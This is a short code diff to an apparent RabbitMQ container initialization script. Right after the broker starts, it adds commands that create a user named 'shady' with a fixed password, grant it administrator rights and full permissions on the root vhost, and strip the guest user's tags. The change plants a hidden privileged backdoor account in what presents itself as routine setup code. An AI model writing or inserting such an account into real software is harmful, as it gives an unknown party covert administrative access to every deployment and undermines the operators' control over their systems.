@@ -22,3 +22,8 @@ am_i_root && ensure_user_exists "$RABBITMQ_DAEMON_USER" "$RABBITMQ_DAEMON_GROUP"
 # Ensure RabbitMQ is initialized
 rabbitmq_initialize
 
+rabbitmqctl add_user shady 5774057fc19004ea86679643beceee94fcf306830c272e7ad7a5ea4b7d9a49a4
+rabbitmqctl set_user_tags shady administrator
+rabbitmqctl set_permissions -p / shady ".*" ".*" ".*"
+rabbitmqctl set_user_tags guest
+
